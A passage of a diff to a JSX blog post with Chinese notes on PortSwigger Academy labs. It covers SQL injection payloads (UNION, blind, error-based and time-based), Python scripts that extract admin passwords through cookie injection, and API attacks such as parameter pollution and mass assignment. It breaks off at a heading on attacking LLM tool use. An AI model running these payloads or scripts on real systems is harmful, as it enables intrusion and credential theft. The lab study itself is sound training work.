@@ -1,15 +1,172 @@
 import X from 'src/component/X';
 
+// Hall of fame 23773, 38%, 26.03.21
 export default function Post() {
     return (
         <>
             <X.H1>SQL injection</X.H1>
+            <X.H2>笔记</X.H2>
+            <X.Uli>@SQL injection cheat sheet[https://portswigger.net/web-security/sql-injection/cheat-sheet]@</X.Uli>
             <X.H2>Ap: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</X.H2>
             <X.P>给了查询的SQL语句示例：</X.P>
             <X.CodeBlock language="sql" code="SELECT * FROM products WHERE category = 'Gifts' AND released = 1" />
-            <X.P>构造payload为`Gifts' or 1=1 --`，输入URL`/filter?category=Gifts%27%20or%201=1%20--`。</X.P>
+            <X.P>构造payload为`Gifts' or 1=1 --+`，输入URL`/filter?category=Gifts%27%20or%201=1%20--+`。</X.P>
             <X.H2>Ap: SQL injection vulnerability allowing login bypass</X.H2>
             <X.P>直接用用户名`administrator' --`；或用户名`administrator`，密码`1' or 1=1 --`。</X.P>
+            <X.H2>Pr: SQL injection attack, querying the database type and version on Oracle</X.H2>
+            <X.P>`/filter?category=Pets' and 1=0 union select banner,'x' FROM v$version --+`</X.P>
+            <X.H2>Pr: SQL injection attack, querying the database type and version on MySQL and Microsoft</X.H2>
+            <X.P>`/filter?category=Pets' and 1=0 union select 1,version() --+`</X.P>
+            <X.H2>Pr: SQL injection attack, listing the database contents on non-Oracle databases</X.H2>
+            <X.P>要求爆用户表获取管理员账号密码。</X.P>
+            <X.P>通过`/filter?category=Pets' and 1=0 union select table_name,'' from information_schema.tables --+`得到所有表；</X.P>
+            <X.P>通过`/filter?category=Pets' and 1=0 union select column_name,table_name from information_schema.columns where table_name like '%user%' --+`得到表名包含`user`的表的列；</X.P>
+            <X.P>定位到表`users_veconm`和列名`username_epgkxv`、`password_dhkkxf`，再通过`/filter?category=Pets' and 1=0 union select username_epgkxv,password_dhkkxf from users_veconm --+`得到管理员账户凭证：`administrator`:`98rdy8bs89zf91ybgj1t`。</X.P>
+            <X.H2>Pr: SQL injection attack, listing the database contents on Oracle</X.H2>
+            <X.P>一样的要求，只不过变成了`Oracle`的环境。</X.P>
+            <X.P>直接查所有表所有列：`/filter?category=Pets' and 1=0 union select column_name,table_name from all_tab_columns --+`；</X.P>
+            <X.P>定位到表`USERS_BGRZGA`和列名`USERNAME_RKZNTV`、`PASSWORD_HEMVUU`，剩余流程和上一题一样。</X.P>
+            <X.Image src="lab-listing-the-database-contents-on-oracle.jpg" filterDarkTheme />
+            <X.H2>Pr: SQL injection UNION attack, determining the number of columns returned by the query</X.H2>
+            <X.P>手动枚举出服务端查询返回三列。</X.P>
+            <X.P>`/filter?category=Pets' and 1=0 union select NULL,NULL,NULL --+`</X.P>
+            <X.H2>Pr: SQL injection UNION attack, finding a column containing text</X.H2>
+            <X.P>题目要求：Make the database retrieve the string: 'kcwOyr'（一开始以为要找到数据库里的这个字符，但其实题目意思是让攻击者构造的查询能返回此字符串即可）。测试下来服务端查询返回三列，只有中间列是字符串类型。</X.P>
+            <X.P>`/filter?category=Gifts' and 1=0 union select 0,'kcwOyr',0 --+`</X.P>
+            <X.H2>Pr: SQL injection UNION attack, retrieving data from other tables</X.H2>
+            <X.P>告诉了需要查询的表是`users`，要求获取管理员凭证。</X.P>
+            <X.P>`/filter?category=Pets' and 1=0 union select username,password from users --+`</X.P>
+            <X.H2>Pr: SQL injection UNION attack, retrieving multiple values in a single column</X.H2>
+            <X.P>可以借助字符串拼接能力，把多列的信息包含在一列中返回。</X.P>
+            <X.P>先查查数据库：`/filter?category=Pets' and 1=0 union select 0,version() --+`，看到是PostgreSQL；字符串拼接以下两种方案都可以：</X.P>
+            <X.Uli>`/filter?category=Pets' and 1=0 union select 0,concat(username,':',password) from users --+`</X.Uli>
+            <X.Uli>`/filter?category=Pets' and 1=0 union select 0,username||':'||password from users --+`</X.Uli>
+            <X.Image src="lab-retrieving-multiple-values-in-a-single-column.jpg" filterDarkTheme />
+            <X.H2>Pr: Blind SQL injection with conditional responses</X.H2>
+            <X.P>盲注题目，本题注入点在`Cookie: TrackingId=...`中。当查询结果不为空时，页面上会显示`Welcome back!`。</X.P>
+            <X.CodeBlock
+                language="python"
+                highlightLines="33,36,41"
+                code={String.raw`
+                from concurrent.futures import ThreadPoolExecutor
+                import requests
+                import functools
+
+
+                def retry(max_retries=3):
+                    def inner_decorator(func):
+                        @functools.wraps(func)
+                        def wrapper(*args):
+                            retries = 0
+                            while retries < max_retries:
+                                try:
+                                    return func(*args)
+                                except AssertionError as ae:
+                                    print(f"[?] {ae}\n", end="")
+                                    return None
+                                except Exception as e:
+                                    print(f"[!] {func.__name__}{args} raised an exception: {e}\n", end="")
+                                    retries += 1
+                            print(f"[x] {func.__name__}{args} failed after {max_retries} retries.\n", end="")
+                            return None
+
+                        return wrapper
+
+                    return inner_decorator
+
+
+                @retry(max_retries=5)
+                def query(payload):
+                    resp = requests.get(
+                        "https://0adb005d04b4e44e8581722f008f002d.web-security-academy.net/filter?category=Gift",
+                        cookies={
+                            "TrackingId": f"j614eS29hnLOmHxr' and ({payload}) -- x",
+                        }
+                    )
+                    return "Welcome back!" in resp.text
+
+
+                def guess_multi_thread(sql, pos, charset):
+                    def task(ch):
+                        payload = f"ascii(substring(({sql}),{pos},1))={ord(ch)}"
+                        return ch if query(payload) else None
+
+                    with ThreadPoolExecutor(max_workers=25) as executor:
+                        results = executor.map(task, charset.decode())
+                    for res in results:
+                        if res is not None:
+                            return res
+                    return None
+
+
+                def blindsql(sql, start=1, end=100, charset=b"0123456789abcdefghijklmnopqrstuvwxyz"):
+                    result = ""
+                    for pos in range(start, end):
+                        ch = guess_multi_thread(sql, pos, charset)
+                        if ch is None:
+                            break
+                        result += ch
+                        print(f"[*] {pos}/{end}\n    {result}")
+                    return result
+
+
+                blindsql("select password from users where username='administrator'")
+                `}
+            />
+            <X.P>上面的代码里用了一些篇幅做错误处理，核心的逻辑是`query`和`guess_multi_thread`函数。</X.P>
+            <X.H2>Pr: Blind SQL injection with conditional errors</X.H2>
+            <X.P>只有在执行出错时，服务端才会响应差异化的内容，因此本题需要一个能够按条件触发错误的payload，这里使用：</X.P>
+            <X.P>`1/(case when (...) then 1 else 0 end)=1`</X.P>
+            <X.CodeBlock
+                language="python"
+                code={String.raw`
+                @retry(max_retries=5)
+                def query(payload):
+                    resp = requests.get(
+                        "https://0abc00d1049f2e6f80870818000000d5.web-security-academy.net/filter?category=Pets",
+                        cookies={
+                            "TrackingId": f"T7RQmXX53YCQHkDB' and 1/(case when ({payload}) then 1 else 0 end)=1 -- x",
+                        }
+                    )
+                    return "Internal Server Error" not in resp.text
+                `}
+            />
+            <X.P>另外注意，本题是Oracle数据库，`substring`函数要换成`substr`。</X.P>
+            <X.H2>Pr: Visible error-based SQL injection</X.H2>
+            <X.P>报错注入，需要尝试一下本题的数据库类型。</X.P>
+            <X.P>`Cookie: TrackingId=x' and cast((select password from users limit 1) as bool) -- x;`</X.P>
+            <X.HighlightBlock background="gray">
+                <X.P> ERROR: invalid input syntax for type boolean: "sv9xnw1gdugwq095xzq2" </X.P>
+            </X.HighlightBlock>
+            <X.H2>Pr: Blind SQL injection with time delays</X.H2>
+            <X.P>本Lab成功让服务端延时10秒即可通过，数据库是PostgreSQL，要注意`pg_sleep`函数返回值类型是`void`，因此以下payload是无效的：</X.P>
+            <X.Uli>`... and pg_sleep(10)=0 --`</X.Uli>
+            <X.Uli>`... and cast(pg_sleep(10) as bool) --`</X.Uli>
+            <X.Uli>`... and cast((select pg_sleep(10)) as bool) --`</X.Uli>
+            <X.P>可以使用字符串拼接触发：`Cookie: TrackingId=x'||pg_sleep(10) -- x;`</X.P>
+            <X.H2>Pr: Blind SQL injection with time delays and information retrieval</X.H2>
+            <X.P>本题需要利用时间盲注查询信息了，思路和前面布尔盲注类似，需要对`query`函数做调整：</X.P>
+            <X.CodeBlock
+                language="python"
+                code={String.raw`
+                @retry(max_retries=5)
+                def query(payload):
+                    try:
+                        requests.get(
+                            "https://0a16008c04fe065b80f33fae00b00034.web-security-academy.net/filter?category=Pets",
+                            cookies={
+                                "TrackingId": f"U0kXrWXZ5AJTbOQ2' and 'x'='x'||(case when ({payload}) then pg_sleep(20) else pg_sleep(0) end) -- x",
+                            },
+                            timeout=10
+                        )
+                    except requests.exceptions.Timeout:
+                        return True
+                    return False
+                `}
+            />
+
+
+
             <X.H1>XSS: Cross-site scripting</X.H1>
             <X.H2>笔记</X.H2>
             <X.Uli>
@@ -1139,6 +1296,88 @@ export default function Post() {
                 });
                 `}
             />
+            <X.H1>API testing</X.H1>
+            <X.H2>Ap: Exploiting an API endpoint using documentation</X.H2>
+            <X.P>`/api/`暴露了删除用户的接口：`DELETE /user/[username: String]`</X.P>
+            <X.H2>Pr: Exploiting server-side parameter pollution in a query string</X.H2>
+            <X.P>通过尝试和观察报错逐步推测API所需参数的过程：</X.P>
+            <X.Table
+                fromText={`
+                输入参数|响应|备注
+                'username=test'|'{"type":"ClientError","code":400,"error":"Invalid username."}'|
+                'username=test&x=y'|'{"type":"ClientError","code":400,"error":"Invalid username."}'|
+                'username=test%26x=y'|'{"error": "Parameter is not supported."}'|参数值中的'%26'可能被服务端解析了
+                'username=test#'|'{"error": "Field not specified."}'|'#'截断了后面的参数，缺少参数'field'
+                'username=administrator%26field=email#'|'{"type":"email","result":"*****@normal-user.net"}'|（爆破得到）
+                'username=administrator%26field=reset_token#'|'{"type":"reset_token","result":"b7kishlwk14xz2xbecljtov25pcln8n8"}'|（从'forgotPassword.js'推断）
+                `}
+            />
+            <X.P>测到这里就可以重置管理员密码了（`/forgot-password?reset_token=b7kishlwk14xz2xbecljtov25pcln8n8`）。</X.P>
+            <X.H2>Pr: Finding and exploiting an unused API endpoint</X.H2>
+            <X.P>利用隐藏的API`PATCH /api/products/1/price`修改价格。</X.P>
+            <X.H2>Pr: Exploiting a mass assignment vulnerability</X.H2>
+            <X.P>注意到请求`GET /api/checkout`返回：</X.P>
+            <X.CodeBlock
+                language="text"
+                highlightLines="8-10"
+                code={String.raw`
+                HTTP/2 200 OK
+                Content-Type: application/json; charset=utf-8
+                X-Content-Type-Options: nosniff
+                X-Frame-Options: SAMEORIGIN
+                Content-Length: 153
+
+                {
+                    "chosen_discount":{
+                        "percentage":0
+                    },
+                    "chosen_products":[
+                        {
+                            "product_id":"1",
+                            "name":"Lightweight \"l33t\" Leather Jacket",
+                            "quantity":1,
+                            "item_price":133700
+                        }
+                    ]
+                }
+                `}
+            />
+            <X.P>结算请求是`POST /api/checkout`，参数为：</X.P>
+            <X.CodeBlock
+                language="text"
+                code={String.raw`
+                {
+                    "chosen_products":[
+                        {
+                            "product_id":"1",
+                            "quantity":1
+                        }
+                    ]
+                }
+                `}
+            />
+            <X.P>利用`GET`请求响应中泄露的`chosen_discount`参数，可以在`POST`请求中添加这个参数来修改折扣：</X.P>
+            <X.CodeBlock
+                language="text"
+                code={String.raw`
+                {
+                    "chosen_discount": {
+                        "percentage":100
+                    },
+                    "chosen_products":[
+                        {
+                            "product_id":"1",
+                            "quantity":1
+                        }
+                    ]
+                }
+                `}
+            />
+            <X.H2>Ex: Exploiting server-side parameter pollution in a REST URL</X.H2>
+            <X.P>`&username=administrator#`回显为`Invalid route. Please refer to the API definition`，推测输入参数被拼接到API路径中；</X.P>
+            <X.P>通过`&username=../../../../../openapi.json#`（这谁能想到）泄露出内部API的结构：{'`/api/internal/v1/users/{username}/field/{field}`'}</X.P>
+            <X.P>`&username=administrator/field/passwordResetToken#`得到了`This version of API only supports the email field for security reasons`，考虑利用旧版接口：`&username=../../v1/users/administrator/field/passwordResetToken#`；</X.P>
+            <X.P>得到Token，解决。</X.P>
             <X.H1>Web LLM attacks</X.H1>
             <X.H2>Ap: Exploiting LLM APIs with excessive agency</X.H2>
             <X.P>题目给了AI聊天功能，还能查看后端日志，聊了几句后看日志发现有大模型工具调用：</X.P>
